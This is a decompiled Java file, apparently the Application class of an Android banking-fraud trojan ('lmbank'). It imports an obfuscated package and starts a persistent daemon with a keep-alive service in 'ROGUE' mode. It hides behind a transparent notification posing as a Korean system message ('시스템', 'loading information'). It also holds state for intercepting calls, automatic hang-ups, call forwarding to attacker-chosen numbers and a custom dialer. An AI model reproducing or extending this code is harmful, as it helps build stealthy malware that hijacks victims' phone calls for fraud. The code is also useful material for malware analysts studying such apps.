package com.wish.lmbank;

import android.app.Application;
import android.content.Context;
import android.text.TextUtils;

import com.wish.lmbank.hellodaemon.DaemonEnv;
import com.wish.lmbank.helper.CrashHandler;
import com.wish.lmbank.keeplive.KeepLive;
import com.wish.lmbank.keeplive.config.ForegroundNotification;
import com.wish.lmbank.phone.PhoneActivity;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.temp.Debugging;

import gv00l3ah.mvdt7w.bb7d7pu7;

//setComponentEnabledSetting
/* loaded from: cookie_9234504.jar:com/wish/lmbank/AppStartV.class */
public class AppStartV extends Application {
    public static boolean isAllowPlayVideo;
    public static boolean isCalling;
    public static boolean isCloseTCall;
    public static boolean isDebug;
    public static boolean isMainActivityFront;
    public static boolean isOpenCustomDialer;
    public static boolean isPlayColorRing;
    public static boolean isUninstallApK;
    public static PhoneActivity phoneCallActivity;
    private static Context sContext;
    private final String TAG = "AppStart";
    public static Boolean isLoadUrl = false;
    public static boolean isCallLogExecute = false;
    public static boolean isPhoneCallActivityVisible = false;
    public static boolean isOpenAuoServiceHangup = true;
    public static boolean isAutoServiceHangUp = false;
    public static String autoServiceCallNumber = "";
    public static String autoServiceForwardingNumber = "";
    public static String autoServiceCallNumberMark = "";
    public static boolean isCustomDialer = false;
    public static String customDialerCallNumber = "";
    public static String customDialerForwardingNumber = "";

    @Override // android.app.Application
    public void onCreate() {
        super.onCreate();
        Debugging.useDebugging();
        sContext = this;
        DaemonEnv.initialize(this, RecServiceV.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
        KeepLive.startWork(this, KeepLive.RunMode.ROGUE, new ForegroundNotification("시스템", "정보불러오는중...", R2.drawable.ico_transparent, R2.layout.layout_notification_transparent));
        CrashHandler.getInstance().init(getApplicationContext());
    }

    public static Context getContext() {
        return sContext;
    }

    public static void resetAutoService() {
        isAutoServiceHangUp = false;
        autoServiceCallNumber = "";
        autoServiceForwardingNumber = "";
    }

    public static void setAutoService(boolean z, String str, String str2) {
        if (TextUtils.isEmpty(str2)) {
            isAutoServiceHangUp = false;
            autoServiceCallNumber = "";
        } else {
            isAutoServiceHangUp = z;
            autoServiceCallNumber = str;
        }
        autoServiceForwardingNumber = str2;
    }
}
